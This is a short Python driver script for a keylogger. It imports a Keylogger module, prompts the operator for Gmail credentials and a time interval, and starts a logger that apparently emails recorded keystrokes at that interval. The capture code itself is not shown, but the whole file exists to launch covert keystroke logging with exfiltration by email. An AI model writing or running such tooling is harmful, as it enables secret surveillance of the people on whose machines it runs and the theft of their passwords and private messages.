#!/usr/bin/env python
import Keylogger

print("Please enter your gmail's credentials here so that log email can be sent.")
print("")
email = input("Email Address : ")
password = input("Email's password : ")
print("Enter the number of seconds in which you want the email to be sent-")
seconds = input("seconds : ")
# time_interval = input("Enter the Time Interval After Which You Need the Records : ")

my_keylogger = Keylogger.Keylogger(seconds, email, password)
my_keylogger.start()
